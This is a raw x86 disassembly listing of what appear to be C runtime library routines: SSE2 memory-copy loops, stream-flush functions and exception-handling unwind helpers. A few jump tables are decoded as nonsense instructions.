  423494:	movdqa xmm2,xmm3
  423498:	palignr xmm3,xmm1,0x8
  42349e:	movdqa XMMWORD PTR [edi],xmm3
  4234a2:	movdqa xmm4,xmm0
  4234a6:	palignr xmm0,xmm2,0x8
  4234ac:	movdqa XMMWORD PTR [edi+0x10],xmm0
  4234b1:	movdqa xmm1,xmm5
  4234b5:	palignr xmm5,xmm4,0x8
  4234bb:	movdqa XMMWORD PTR [edi+0x20],xmm5
  4234c0:	lea    edi,[edi+0x30]
  4234c3:	jge    0x42347c
  4234c5:	lea    esi,[esi+0x8]
  4234c8:	jmp    0x423520
  4234ca:	movdqa xmm1,XMMWORD PTR [esi-0x4]
  4234cf:	lea    esi,[esi-0x4]
  4234d2:	mov    edi,edi
  4234d4:	movdqa xmm3,XMMWORD PTR [esi+0x10]
  4234d9:	sub    ecx,0x30
  4234dc:	movdqa xmm0,XMMWORD PTR [esi+0x20]
  4234e1:	movdqa xmm5,XMMWORD PTR [esi+0x30]
  4234e6:	lea    esi,[esi+0x30]
  4234e9:	cmp    ecx,0x30
  4234ec:	movdqa xmm2,xmm3
  4234f0:	palignr xmm3,xmm1,0x4
  4234f6:	movdqa XMMWORD PTR [edi],xmm3
  4234fa:	movdqa xmm4,xmm0
  4234fe:	palignr xmm0,xmm2,0x4
  423504:	movdqa XMMWORD PTR [edi+0x10],xmm0
  423509:	movdqa xmm1,xmm5
  42350d:	palignr xmm5,xmm4,0x4
  423513:	movdqa XMMWORD PTR [edi+0x20],xmm5
  423518:	lea    edi,[edi+0x30]
  42351b:	jge    0x4234d4
  42351d:	lea    esi,[esi+0x4]
  423520:	cmp    ecx,0x10
  423523:	jl     0x423538
  423525:	movdqu xmm1,XMMWORD PTR [esi]
  423529:	sub    ecx,0x10
  42352c:	lea    esi,[esi+0x10]
  42352f:	movdqa XMMWORD PTR [edi],xmm1
  423533:	lea    edi,[edi+0x10]
  423536:	jmp    0x423520
  423538:	bt     ecx,0x2
  42353c:	jae    0x42354b
  42353e:	mov    eax,DWORD PTR [esi]
  423540:	sub    ecx,0x4
  423543:	lea    esi,[esi+0x4]
  423546:	mov    DWORD PTR [edi],eax
  423548:	lea    edi,[edi+0x4]
  42354b:	bt     ecx,0x3
  42354f:	jae    0x423562
  423551:	movq   xmm1,QWORD PTR [esi]
  423555:	sub    ecx,0x8
  423558:	lea    esi,[esi+0x8]
  42355b:	movq   QWORD PTR [edi],xmm1
  42355f:	lea    edi,[edi+0x8]
  423562:	mov    eax,DWORD PTR [ecx*4+0x423698]
  423569:	jmp    eax
  42356b:	test   edi,0x3
  423571:	jne    0x423588
  423573:	shr    ecx,0x2
  423576:	and    edx,0x3
  423579:	cmp    ecx,0x8
  42357c:	jb     0x4235a8
  42357e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423580:	jmp    DWORD PTR [edx*4+0x423698]
  423587:	nop
  423588:	mov    eax,edi
  42358a:	mov    edx,0x3
  42358f:	sub    ecx,0x4
  423592:	jb     0x4235a0
  423594:	and    eax,0x3
  423597:	add    ecx,eax
  423599:	jmp    DWORD PTR [eax*4+0x4235ac]
  4235a0:	jmp    DWORD PTR [ecx*4+0x4236a8]
  4235a7:	nop
  4235a8:	jmp    DWORD PTR [ecx*4+0x42362c]
  4235af:	nop
  4235b0:	mov    esp,0xe8004235
  4235b5:	xor    eax,0x360c0042
  4235ba:	inc    edx
  4235bb:	add    BYTE PTR [ebx],ah
  4235bd:	ror    DWORD PTR [edx-0x75f877fa],1
  4235c3:	inc    esi
  4235c4:	add    DWORD PTR [eax+0x468a0147],ecx
  4235ca:	add    al,cl
  4235cc:	jmp    0x289bdd3
  4235d1:	add    esi,0x3
  4235d4:	add    edi,0x3
  4235d7:	cmp    ecx,0x8
  4235da:	jb     0x4235a8
  4235dc:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235de:	jmp    DWORD PTR [edx*4+0x423698]
  4235e5:	lea    ecx,[ecx+0x0]
  4235e8:	and    edx,ecx
  4235ea:	mov    al,BYTE PTR [esi]
  4235ec:	mov    BYTE PTR [edi],al
  4235ee:	mov    al,BYTE PTR [esi+0x1]
  4235f1:	shr    ecx,0x2
  4235f4:	mov    BYTE PTR [edi+0x1],al
  4235f7:	add    esi,0x2
  4235fa:	add    edi,0x2
  4235fd:	cmp    ecx,0x8
  423600:	jb     0x4235a8
  423602:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423604:	jmp    DWORD PTR [edx*4+0x423698]
  42360b:	nop
  42360c:	and    edx,ecx
  42360e:	mov    al,BYTE PTR [esi]
  423610:	mov    BYTE PTR [edi],al
  423612:	add    esi,0x1
  423615:	shr    ecx,0x2
  423618:	add    edi,0x1
  42361b:	cmp    ecx,0x8
  42361e:	jb     0x4235a8
  423620:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423622:	jmp    DWORD PTR [edx*4+0x423698]
  423629:	lea    ecx,[ecx+0x0]
  42362c:	(bad)  
  42362d:	ss inc edx
  42362f:	add    BYTE PTR [esi+esi*1+0x42],bh
  423633:	add    BYTE PTR [esi+esi*1+0x42],dh
  423637:	add    BYTE PTR [esi+esi*1+0x42],ch
  42363b:	add    BYTE PTR [esi+esi*1+0x42],ah
  42363f:	add    BYTE PTR [esi+esi*1+0x42],bl
  423643:	add    BYTE PTR [esi+esi*1+0x42],dl
  423647:	add    BYTE PTR [esi+esi*1+0x42],cl
  42364b:	add    BYTE PTR [ebx-0x761b71bc],cl
  423651:	inc    esp
  423652:	(bad)  
  423653:	in     al,0x8b
  423655:	inc    esp
  423656:	mov    gs,eax
  423658:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  42365c:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  423660:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  423664:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  423668:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  42366c:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  423670:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  423674:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  423678:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  42367c:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  423680:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  423684:	lea    eax,[ecx*4+0x0]
  42368b:	add    esi,eax
  42368d:	add    edi,eax
  42368f:	jmp    DWORD PTR [edx*4+0x423698]
  423696:	mov    edi,edi
  423698:	test   al,0x36
  42369a:	inc    edx
  42369b:	add    BYTE PTR [eax-0x43ffbdca],dh
  4236a1:	ss inc edx
  4236a3:	add    al,dl
  4236a5:	ss inc edx
  4236a7:	add    BYTE PTR [ebx+0x5e0c2444],cl
  4236ad:	pop    edi
  4236ae:	ret    
  4236af:	nop
  4236b0:	mov    al,BYTE PTR [esi]
  4236b2:	mov    BYTE PTR [edi],al
  4236b4:	mov    eax,DWORD PTR [esp+0xc]
  4236b8:	pop    esi
  4236b9:	pop    edi
  4236ba:	ret    
  4236bb:	nop
  4236bc:	mov    al,BYTE PTR [esi]
  4236be:	mov    BYTE PTR [edi],al
  4236c0:	mov    al,BYTE PTR [esi+0x1]
  4236c3:	mov    BYTE PTR [edi+0x1],al
  4236c6:	mov    eax,DWORD PTR [esp+0xc]
  4236ca:	pop    esi
  4236cb:	pop    edi
  4236cc:	ret    
  4236cd:	lea    ecx,[ecx+0x0]
  4236d0:	mov    al,BYTE PTR [esi]
  4236d2:	mov    BYTE PTR [edi],al
  4236d4:	mov    al,BYTE PTR [esi+0x1]
  4236d7:	mov    BYTE PTR [edi+0x1],al
  4236da:	mov    al,BYTE PTR [esi+0x2]
  4236dd:	mov    BYTE PTR [edi+0x2],al
  4236e0:	mov    eax,DWORD PTR [esp+0xc]
  4236e4:	pop    esi
  4236e5:	pop    edi
  4236e6:	ret    
  4236e7:	nop
  4236e8:	lea    esi,[ecx+esi*1-0x4]
  4236ec:	lea    edi,[ecx+edi*1-0x4]
  4236f0:	test   edi,0x3
  4236f6:	jne    0x42371c
  4236f8:	shr    ecx,0x2
  4236fb:	and    edx,0x3
  4236fe:	cmp    ecx,0x8
  423701:	jb     0x423710
  423703:	std    
  423704:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423706:	cld    
  423707:	jmp    DWORD PTR [edx*4+0x423834]
  42370e:	mov    edi,edi
  423710:	neg    ecx
  423712:	jmp    DWORD PTR [ecx*4+0x4237e4]
  423719:	lea    ecx,[ecx+0x0]
  42371c:	mov    eax,edi
  42371e:	mov    edx,0x3
  423723:	cmp    ecx,0x4
  423726:	jb     0x423734
  423728:	and    eax,0x3
  42372b:	sub    ecx,eax
  42372d:	jmp    DWORD PTR [eax*4+0x423738]
  423734:	jmp    DWORD PTR [ecx*4+0x423834]
  42373b:	nop
  42373c:	dec    eax
  42373d:	aaa    
  42373e:	inc    edx
  42373f:	add    BYTE PTR [edi+esi*1+0x42],ch
  423743:	add    BYTE PTR [edi+esi*1+0x468a0042],dl
  42374a:	add    esp,DWORD PTR [ebx]
  42374c:	ror    DWORD PTR [eax-0x117cfcb9],1
  423752:	add    ecx,eax
  423754:	jmp    0x231ba5b
  423759:	cmp    ecx,0x8
  42375c:	jb     0x423710
  42375e:	std    
  42375f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423761:	cld    
  423762:	jmp    DWORD PTR [edx*4+0x423834]
  423769:	lea    ecx,[ecx+0x0]
  42376c:	mov    al,BYTE PTR [esi+0x3]
  42376f:	and    edx,ecx
  423771:	mov    BYTE PTR [edi+0x3],al
  423774:	mov    al,BYTE PTR [esi+0x2]
  423777:	shr    ecx,0x2
  42377a:	mov    BYTE PTR [edi+0x2],al
  42377d:	sub    esi,0x2
  423780:	sub    edi,0x2
  423783:	cmp    ecx,0x8
  423786:	jb     0x423710
  423788:	std    
  423789:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42378b:	cld    
  42378c:	jmp    DWORD PTR [edx*4+0x423834]
  423793:	nop
  423794:	mov    al,BYTE PTR [esi+0x3]
  423797:	and    edx,ecx
  423799:	mov    BYTE PTR [edi+0x3],al
  42379c:	mov    al,BYTE PTR [esi+0x2]
  42379f:	mov    BYTE PTR [edi+0x2],al
  4237a2:	mov    al,BYTE PTR [esi+0x1]
  4237a5:	shr    ecx,0x2
  4237a8:	mov    BYTE PTR [edi+0x1],al
  4237ab:	sub    esi,0x3
  4237ae:	sub    edi,0x3
  4237b1:	cmp    ecx,0x8
  4237b4:	jb     0x423710
  4237ba:	std    
  4237bb:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237bd:	cld    
  4237be:	jmp    DWORD PTR [edx*4+0x423834]
  4237c5:	lea    ecx,[ecx+0x0]
  4237c8:	call   0xf0427a04
  4237cd:	aaa    
  4237ce:	inc    edx
  4237cf:	add    al,bh
  4237d1:	aaa    
  4237d2:	inc    edx
  4237d3:	add    BYTE PTR [eax],al
  4237d5:	cmp    BYTE PTR [edx+0x0],al
  4237d8:	or     BYTE PTR [eax],bh
  4237da:	inc    edx
  4237db:	add    BYTE PTR [eax],dl
  4237dd:	cmp    BYTE PTR [edx+0x0],al
  4237e0:	sbb    BYTE PTR [eax],bh
  4237e2:	inc    edx
  4237e3:	add    BYTE PTR [ebx],ch
  4237e5:	cmp    BYTE PTR [edx+0x0],al
  4237e8:	mov    eax,DWORD PTR [esi+ecx*4+0x1c]
  4237ec:	mov    DWORD PTR [edi+ecx*4+0x1c],eax
  4237f0:	mov    eax,DWORD PTR [esi+ecx*4+0x18]
  4237f4:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  4237f8:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4237fc:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  423800:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  423804:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  423808:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  42380c:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  423810:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  423814:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  423818:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  42381c:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  423820:	lea    eax,[ecx*4+0x0]
  423827:	add    esi,eax
  423829:	add    edi,eax
  42382b:	jmp    DWORD PTR [edx*4+0x423834]
  423832:	mov    edi,edi
  423834:	inc    esp
  423835:	cmp    BYTE PTR [edx+0x0],al
  423838:	dec    esp
  423839:	cmp    BYTE PTR [edx+0x0],al
  42383c:	pop    esp
  42383d:	cmp    BYTE PTR [edx+0x0],al
  423840:	jo     0x42387a
  423842:	inc    edx
  423843:	add    BYTE PTR [ebx+0x5e0c2444],cl
  423849:	pop    edi
  42384a:	ret    
  42384b:	nop
  42384c:	mov    al,BYTE PTR [esi+0x3]
  42384f:	mov    BYTE PTR [edi+0x3],al
  423852:	mov    eax,DWORD PTR [esp+0xc]
  423856:	pop    esi
  423857:	pop    edi
  423858:	ret    
  423859:	lea    ecx,[ecx+0x0]
  42385c:	mov    al,BYTE PTR [esi+0x3]
  42385f:	mov    BYTE PTR [edi+0x3],al
  423862:	mov    al,BYTE PTR [esi+0x2]
  423865:	mov    BYTE PTR [edi+0x2],al
  423868:	mov    eax,DWORD PTR [esp+0xc]
  42386c:	pop    esi
  42386d:	pop    edi
  42386e:	ret    
  42386f:	nop
  423870:	mov    al,BYTE PTR [esi+0x3]
  423873:	mov    BYTE PTR [edi+0x3],al
  423876:	mov    al,BYTE PTR [esi+0x2]
  423879:	mov    BYTE PTR [edi+0x2],al
  42387c:	mov    al,BYTE PTR [esi+0x1]
  42387f:	mov    BYTE PTR [edi+0x1],al
  423882:	mov    eax,DWORD PTR [esp+0xc]
  423886:	pop    esi
  423887:	pop    edi
  423888:	ret    
  423889:	lea    esp,[esp+0x0]
  423890:	push   edi
  423891:	mov    eax,esi
  423893:	and    eax,0xf
  423896:	test   eax,eax
  423898:	jne    0x423970
  42389e:	mov    edx,ecx
  4238a0:	and    ecx,0x7f
  4238a3:	shr    edx,0x7
  4238a6:	je     0x42390d
  4238a8:	lea    esp,[esp+0x0]
  4238af:	nop
  4238b0:	movdqa xmm0,XMMWORD PTR [esi]
  4238b4:	movdqa xmm1,XMMWORD PTR [esi+0x10]
  4238b9:	movdqa xmm2,XMMWORD PTR [esi+0x20]
  4238be:	movdqa xmm3,XMMWORD PTR [esi+0x30]
  4238c3:	movdqa XMMWORD PTR [edi],xmm0
  4238c7:	movdqa XMMWORD PTR [edi+0x10],xmm1
  4238cc:	movdqa XMMWORD PTR [edi+0x20],xmm2
  4238d1:	movdqa XMMWORD PTR [edi+0x30],xmm3
  4238d6:	movdqa xmm4,XMMWORD PTR [esi+0x40]
  4238db:	movdqa xmm5,XMMWORD PTR [esi+0x50]
  4238e0:	movdqa xmm6,XMMWORD PTR [esi+0x60]
  4238e5:	movdqa xmm7,XMMWORD PTR [esi+0x70]
  4238ea:	movdqa XMMWORD PTR [edi+0x40],xmm4
  4238ef:	movdqa XMMWORD PTR [edi+0x50],xmm5
  4238f4:	movdqa XMMWORD PTR [edi+0x60],xmm6
  4238f9:	movdqa XMMWORD PTR [edi+0x70],xmm7
  4238fe:	lea    esi,[esi+0x80]
  423904:	lea    edi,[edi+0x80]
  42390a:	dec    edx
  42390b:	jne    0x4238b0
  42390d:	test   ecx,ecx
  42390f:	je     0x423960
  423911:	mov    edx,ecx
  423913:	shr    edx,0x4
  423916:	test   edx,edx
  423918:	je     0x423931
  42391a:	lea    ebx,[ebx+0x0]
  423920:	movdqa xmm0,XMMWORD PTR [esi]
  423924:	movdqa XMMWORD PTR [edi],xmm0
  423928:	lea    esi,[esi+0x10]
  42392b:	lea    edi,[edi+0x10]
  42392e:	dec    edx
  42392f:	jne    0x423920
  423931:	and    ecx,0xf
  423934:	je     0x423960
  423936:	mov    eax,ecx
  423938:	shr    ecx,0x2
  42393b:	je     0x42394a
  42393d:	mov    edx,DWORD PTR [esi]
  42393f:	mov    DWORD PTR [edi],edx
  423941:	lea    esi,[esi+0x4]
  423944:	lea    edi,[edi+0x4]
  423947:	dec    ecx
  423948:	jne    0x42393d
  42394a:	mov    ecx,eax
  42394c:	and    ecx,0x3
  42394f:	je     0x423960
  423951:	mov    al,BYTE PTR [esi]
  423953:	mov    BYTE PTR [edi],al
  423955:	inc    esi
  423956:	inc    edi
  423957:	dec    ecx
  423958:	jne    0x423951
  42395a:	lea    ebx,[ebx+0x0]
  423960:	pop    eax
  423961:	pop    esi
  423962:	pop    edi
  423963:	ret    
  423964:	lea    esp,[esp+0x0]
  42396b:	jmp    0x423970
  42396d:	int3   
  42396e:	int3   
  42396f:	int3   
  423970:	mov    edx,0x10
  423975:	sub    edx,eax
  423977:	sub    ecx,edx
  423979:	push   ecx
  42397a:	mov    eax,edx
  42397c:	mov    ecx,eax
  42397e:	and    ecx,0x3
  423981:	je     0x42398c
  423983:	mov    dl,BYTE PTR [esi]
  423985:	mov    BYTE PTR [edi],dl
  423987:	inc    esi
  423988:	inc    edi
  423989:	dec    ecx
  42398a:	jne    0x423983
  42398c:	shr    eax,0x2
  42398f:	je     0x42399e
  423991:	mov    edx,DWORD PTR [esi]
  423993:	mov    DWORD PTR [edi],edx
  423995:	lea    esi,[esi+0x4]
  423998:	lea    edi,[edi+0x4]
  42399b:	dec    eax
  42399c:	jne    0x423991
  42399e:	pop    ecx
  42399f:	jmp    0x42389e
  4239a4:	push   ebp
  4239a5:	mov    ebp,esp
  4239a7:	mov    eax,DWORD PTR [ebp+0x8]
  4239aa:	test   eax,eax
  4239ac:	jne    0x4239c3
  4239ae:	call   0x41fb32
  4239b3:	mov    DWORD PTR [eax],0x16
  4239b9:	call   0x422622
  4239be:	or     eax,0xffffffff
  4239c1:	pop    ebp
  4239c2:	ret    
  4239c3:	mov    eax,DWORD PTR [eax+0x10]
  4239c6:	pop    ebp
  4239c7:	ret    
  4239c8:	push   ebp
  4239c9:	mov    ebp,esp
  4239cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4239ce:	cmp    ecx,0xfffffffe
  4239d1:	jne    0x4239e0
  4239d3:	call   0x41fb32
  4239d8:	mov    DWORD PTR [eax],0x9
  4239de:	jmp    0x423a18
  4239e0:	test   ecx,ecx
  4239e2:	js     0x423a08
  4239e4:	cmp    ecx,DWORD PTR ds:0x433be4
  4239ea:	jae    0x423a08
  4239ec:	mov    eax,ecx
  4239ee:	and    ecx,0x1f
  4239f1:	sar    eax,0x5
  4239f4:	shl    ecx,0x6
  4239f7:	mov    eax,DWORD PTR [eax*4+0x431df8]
  4239fe:	movsx  eax,BYTE PTR [eax+ecx*1+0x4]
  423a03:	and    eax,0x40
  423a06:	pop    ebp
  423a07:	ret    
  423a08:	call   0x41fb32
  423a0d:	mov    DWORD PTR [eax],0x9
  423a13:	call   0x422622
  423a18:	xor    eax,eax
  423a1a:	pop    ebp
  423a1b:	ret    
  423a1c:	push   ebp
  423a1d:	mov    ebp,esp
  423a1f:	push   esi
  423a20:	mov    esi,DWORD PTR [ebp+0x8]
  423a23:	test   esi,esi
  423a25:	jne    0x423a30
  423a27:	push   esi
  423a28:	call   0x423acf
  423a2d:	pop    ecx
  423a2e:	jmp    0x423a5f
  423a30:	push   esi
  423a31:	call   0x423a62
  423a36:	pop    ecx
  423a37:	test   eax,eax
  423a39:	je     0x423a40
  423a3b:	or     eax,0xffffffff
  423a3e:	jmp    0x423a5f
  423a40:	test   DWORD PTR [esi+0xc],0x4000
  423a47:	je     0x423a5d
  423a49:	push   esi
  423a4a:	call   0x4239a4
  423a4f:	push   eax
  423a50:	call   0x42409d
  423a55:	neg    eax
  423a57:	pop    ecx
  423a58:	pop    ecx
  423a59:	sbb    eax,eax
  423a5b:	jmp    0x423a5f
  423a5d:	xor    eax,eax
  423a5f:	pop    esi
  423a60:	pop    ebp
  423a61:	ret    
  423a62:	push   ebp
  423a63:	mov    ebp,esp
  423a65:	push   ebx
  423a66:	push   esi
  423a67:	mov    esi,DWORD PTR [ebp+0x8]
  423a6a:	xor    ebx,ebx
  423a6c:	mov    eax,DWORD PTR [esi+0xc]
  423a6f:	and    al,0x3
  423a71:	cmp    al,0x2
  423a73:	jne    0x423ab7
  423a75:	test   DWORD PTR [esi+0xc],0x108
  423a7c:	je     0x423ab7
  423a7e:	push   edi
  423a7f:	mov    edi,DWORD PTR [esi]
  423a81:	sub    edi,DWORD PTR [esi+0x8]
  423a84:	test   edi,edi
  423a86:	jle    0x423ab6
  423a88:	push   edi
  423a89:	push   DWORD PTR [esi+0x8]
  423a8c:	push   esi
  423a8d:	call   0x4239a4
  423a92:	pop    ecx
  423a93:	push   eax
  423a94:	call   0x424186
  423a99:	add    esp,0xc
  423a9c:	cmp    eax,edi
  423a9e:	jne    0x423aaf
  423aa0:	mov    eax,DWORD PTR [esi+0xc]
  423aa3:	test   al,al
  423aa5:	jns    0x423ab6
  423aa7:	and    eax,0xfffffffd
  423aaa:	mov    DWORD PTR [esi+0xc],eax
  423aad:	jmp    0x423ab6
  423aaf:	or     DWORD PTR [esi+0xc],0x20
  423ab3:	or     ebx,0xffffffff
  423ab6:	pop    edi
  423ab7:	mov    ecx,DWORD PTR [esi+0x8]
  423aba:	mov    eax,ebx
  423abc:	and    DWORD PTR [esi+0x4],0x0
  423ac0:	mov    DWORD PTR [esi],ecx
  423ac2:	pop    esi
  423ac3:	pop    ebx
  423ac4:	pop    ebp
  423ac5:	ret    
  423ac6:	push   0x1
  423ac8:	call   0x423acf
  423acd:	pop    ecx
  423ace:	ret    
  423acf:	push   0x14
  423ad1:	push   0x42db58
  423ad6:	call   0x4221c0
  423adb:	xor    edi,edi
  423add:	mov    DWORD PTR [ebp-0x1c],edi
  423ae0:	and    DWORD PTR [ebp-0x24],edi
  423ae3:	push   0x1
  423ae5:	call   0x41fabe
  423aea:	pop    ecx
  423aeb:	and    DWORD PTR [ebp-0x4],edi
  423aee:	xor    esi,esi
  423af0:	mov    ebx,DWORD PTR [ebp+0x8]
  423af3:	mov    DWORD PTR [ebp-0x20],esi
  423af6:	cmp    esi,DWORD PTR ds:0x433b44
  423afc:	jge    0x423b88
  423b02:	mov    eax,ds:0x433b40
  423b07:	mov    eax,DWORD PTR [eax+esi*4]
  423b0a:	test   eax,eax
  423b0c:	je     0x423b6b
  423b0e:	test   BYTE PTR [eax+0xc],0x83
  423b12:	je     0x423b6b
  423b14:	push   eax
  423b15:	push   esi
  423b16:	call   0x42298b
  423b1b:	pop    ecx
  423b1c:	pop    ecx
  423b1d:	mov    DWORD PTR [ebp-0x4],0x1
  423b24:	mov    eax,ds:0x433b40
  423b29:	mov    eax,DWORD PTR [eax+esi*4]
  423b2c:	test   BYTE PTR [eax+0xc],0x83
  423b30:	je     0x423b62
  423b32:	cmp    ebx,0x1
  423b35:	jne    0x423b49
  423b37:	push   eax
  423b38:	call   0x423a1c
  423b3d:	pop    ecx
  423b3e:	cmp    eax,0xffffffff
  423b41:	je     0x423b62
  423b43:	inc    edi
  423b44:	mov    DWORD PTR [ebp-0x1c],edi
  423b47:	jmp    0x423b62
  423b49:	test   ebx,ebx
  423b4b:	jne    0x423b62
  423b4d:	test   BYTE PTR [eax+0xc],0x2
  423b51:	je     0x423b62
  423b53:	push   eax
  423b54:	call   0x423a1c
  423b59:	pop    ecx
  423b5a:	cmp    eax,0xffffffff
  423b5d:	jne    0x423b62
  423b5f:	or     DWORD PTR [ebp-0x24],eax
  423b62:	and    DWORD PTR [ebp-0x4],0x0
  423b66:	call   0x423b77
  423b6b:	inc    esi
  423b6c:	jmp    0x423af3
  423b6e:	mov    ebx,DWORD PTR [ebp+0x8]
  423b71:	mov    edi,DWORD PTR [ebp-0x1c]
  423b74:	mov    esi,DWORD PTR [ebp-0x20]
  423b77:	mov    eax,ds:0x433b40
  423b7c:	push   DWORD PTR [eax+esi*4]
  423b7f:	push   esi
  423b80:	call   0x4229f5
  423b85:	pop    ecx
  423b86:	pop    ecx
  423b87:	ret    
  423b88:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  423b8f:	call   0x423baa
  423b94:	cmp    ebx,0x1
  423b97:	mov    eax,edi
  423b99:	je     0x423b9e
  423b9b:	mov    eax,DWORD PTR [ebp-0x24]
  423b9e:	call   0x422205
  423ba3:	ret    
  423ba4:	mov    ebx,DWORD PTR [ebp+0x8]
  423ba7:	mov    edi,DWORD PTR [ebp-0x1c]
  423baa:	push   0x1
  423bac:	call   0x421933
  423bb1:	pop    ecx
  423bb2:	ret    
  423bb3:	int3   
  423bb4:	int3   
  423bb5:	int3   
  423bb6:	int3   
  423bb7:	int3   
  423bb8:	int3   
  423bb9:	int3   
  423bba:	int3   
  423bbb:	int3   
  423bbc:	int3   
  423bbd:	int3   
  423bbe:	int3   
  423bbf:	int3   
  423bc0:	push   ebp
  423bc1:	mov    ebp,esp
  423bc3:	push   ebx
  423bc4:	push   esi
  423bc5:	push   edi
  423bc6:	push   ebp
  423bc7:	push   0x0
  423bc9:	push   0x0
  423bcb:	push   0x423bd8
  423bd0:	push   DWORD PTR [ebp+0x8]
  423bd3:	call   0x410018
  423bd8:	pop    ebp
  423bd9:	pop    edi
  423bda:	pop    esi
  423bdb:	pop    ebx
  423bdc:	mov    esp,ebp
  423bde:	pop    ebp
  423bdf:	ret    
  423be0:	mov    ecx,DWORD PTR [esp+0x4]
  423be4:	test   DWORD PTR [ecx+0x4],0x6
  423beb:	mov    eax,0x1
  423bf0:	je     0x423c24
  423bf2:	mov    eax,DWORD PTR [esp+0x14]
  423bf6:	mov    ecx,DWORD PTR [eax-0x4]
  423bf9:	xor    ecx,eax
  423bfb:	call   0x421878
  423c00:	push   ebp
  423c01:	mov    ebp,DWORD PTR [eax+0x10]
  423c04:	mov    edx,DWORD PTR [eax+0x28]
  423c07:	push   edx
  423c08:	mov    edx,DWORD PTR [eax+0x24]
  423c0b:	push   edx
  423c0c:	call   0x423c25
  423c11:	add    esp,0x8
  423c14:	pop    ebp
  423c15:	mov    eax,DWORD PTR [esp+0x8]
  423c19:	mov    edx,DWORD PTR [esp+0x10]
  423c1d:	mov    DWORD PTR [edx],eax
  423c1f:	mov    eax,0x3
  423c24:	ret    
  423c25:	push   ebx
  423c26:	push   esi
  423c27:	push   edi
  423c28:	mov    eax,DWORD PTR [esp+0x10]
  423c2c:	push   ebp
  423c2d:	push   eax
  423c2e:	push   0xfffffffe
  423c30:	push   0x423be0
  423c35:	push   DWORD PTR fs:0x0
  423c3c:	mov    eax,ds:0x4314e0
  423c41:	xor    eax,esp
  423c43:	push   eax
  423c44:	lea    eax,[esp+0x4]
  423c48:	mov    fs:0x0,eax
  423c4e:	mov    eax,DWORD PTR [esp+0x28]
  423c52:	mov    ebx,DWORD PTR [eax+0x8]
  423c55:	mov    esi,DWORD PTR [eax+0xc]
  423c58:	cmp    esi,0xffffffff
  423c5b:	je     0x423c97
  423c5d:	cmp    DWORD PTR [esp+0x2c],0xffffffff
  423c62:	je     0x423c6a
  423c64:	cmp    esi,DWORD PTR [esp+0x2c]
  423c68:	jbe    0x423c97
  423c6a:	lea    esi,[esi+esi*2]
  423c6d:	mov    ecx,DWORD PTR [ebx+esi*4]
  423c70:	mov    DWORD PTR [esp+0xc],ecx
  423c74:	mov    DWORD PTR [eax+0xc],ecx
  423c77:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  423c7c:	jne    0x423c95
  423c7e:	push   0x101
  423c83:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  423c87:	call   0x423cd5
  423c8c:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  423c90:	call   0x423cf4
  423c95:	jmp    0x423c4e
  423c97:	mov    ecx,DWORD PTR [esp+0x4]
  423c9b:	mov    DWORD PTR fs:0x0,ecx
  423ca2:	add    esp,0x18
  423ca5:	pop    edi
  423ca6:	pop    esi
  423ca7:	pop    ebx
  423ca8:	ret    
  423ca9:	xor    eax,eax
  423cab:	mov    ecx,DWORD PTR fs:0x0
  423cb2:	cmp    DWORD PTR [ecx+0x4],0x423be0
  423cb9:	jne    0x423ccb
  423cbb:	mov    edx,DWORD PTR [ecx+0xc]
  423cbe:	mov    edx,DWORD PTR [edx+0xc]
  423cc1:	cmp    DWORD PTR [ecx+0x8],edx
  423cc4:	jne    0x423ccb
  423cc6:	mov    eax,0x1
  423ccb:	ret    
  423ccc:	push   ebx
  423ccd:	push   ecx
  423cce:	mov    ebx,0x431560
  423cd3:	jmp    0x423ce0
  423cd5:	push   ebx
  423cd6:	push   ecx
  423cd7:	mov    ebx,0x431560
  423cdc:	mov    ecx,DWORD PTR [esp+0xc]
  423ce0:	mov    DWORD PTR [ebx+0x8],ecx
  423ce3:	mov    DWORD PTR [ebx+0x4],eax
  423ce6:	mov    DWORD PTR [ebx+0xc],ebp
  423ce9:	push   ebp
  423cea:	push   ecx
  423ceb:	push   eax
  423cec:	pop    eax
  423ced:	pop    ecx
  423cee:	pop    ebp
  423cef:	pop    ecx
  423cf0:	pop    ebx
  423cf1:	ret    0x4
  423cf4:	call   eax
  423cf6:	ret    
  423cf7:	push   0x10
  423cf9:	push   0x42db80
  423cfe:	call   0x4221c0
  423d03:	xor    edi,edi
  423d05:	mov    DWORD PTR [ebp-0x1c],edi
  423d08:	push   0x1
  423d0a:	call   0x41fabe
  423d0f:	pop    ecx
  423d10:	and    DWORD PTR [ebp-0x4],edi
  423d13:	push   0x3
  423d15:	pop    esi
  423d16:	mov    DWORD PTR [ebp-0x20],esi
  423d19:	cmp    esi,DWORD PTR ds:0x433b44
  423d1f:	jge    0x423d74
